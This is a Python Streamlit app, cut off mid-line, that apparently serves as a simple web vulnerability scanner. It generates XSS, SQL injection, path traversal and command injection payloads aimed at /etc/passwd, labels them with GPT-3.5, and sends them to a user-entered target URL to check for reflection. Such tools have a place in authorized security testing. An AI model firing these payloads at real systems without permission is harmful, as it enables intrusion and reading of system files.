import streamlit as st
import openai
import random, requests
from datetime import datetime
import json

st.set_page_config(page_title="AI Security Toolkit", layout="wide")
st.title("Agentic AI Security Toolkit")
st.caption("Generate, tag, and test payloads using GPT + automation")

# --- INPUTS ---
api_key = st.text_input("Enter your OpenAI API Key", type="password")
target_url = st.text_input("Enter target URL (e.g. http://demo.testfire.net)")
payload_count = st.slider("Number of payloads to use", 10, 200, 50)

# --- GENERATE PAYLOADS ---
def generate_payloads():
    def xss(): return [f"<script>alert({i})</script>" for i in range(1, 51)]
    def sqli(): return [f"' OR {i}={i} --" for i in range(1, 51)]
    def lfi(): return [f"../../{'../'*i}etc/passwd" for i in range(1, 51)]
    def rce(): return [f"; cat /etc/passwd #{i}" for i in range(1, 51)]

    payloads = xss() + sqli() + lfi() + rce()
    random.shuffle(payloads)
    return payloads

# --- TAG PAYLOADS ---
def tag_payloads(payloads):
    openai.api_key = api_key
    tagged = []
    for p in payloads[:payload_count]:
        try:
            res = openai.ChatCompletion.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "Tag this payload as XSS, SQLi, LFI, RCE, or Unknown. Also rate its risk level as High, Medium, Low."},
                    {"role": "user", "content": f"Payload: {p}"}
                ]
            )
            tag = res['choices'][0]['message']['content']
        except Exception as e:
            tag = f"ERROR: {str(e)}"

        tagged.append({"payload": p, "tag": tag, "time": datetime.now().isoformat()})
    return tagged

# --- TEST PAYLOADS ---
def test_payloads(payloads, url):
    results = []
    for p in payloads[:payload_count]:
        try:
            r = requests.get(url, params={"input": p}, timeout=10)
            reflected = p in r.text
            results.append({"payload": p, "reflected": reflected})
        except Exception as e:
            results.append({"payload": p, "reflected": False, "error": str(e)})
    return results

# --- UI BUTTONS ---
payloads = []
tagged_payloads = []
test_results = []

if st.button("Generate Payloads"):
    payloads = generate_payloads()
    st.success(f"Generated {len(payloads)} payloads.")
    st.code
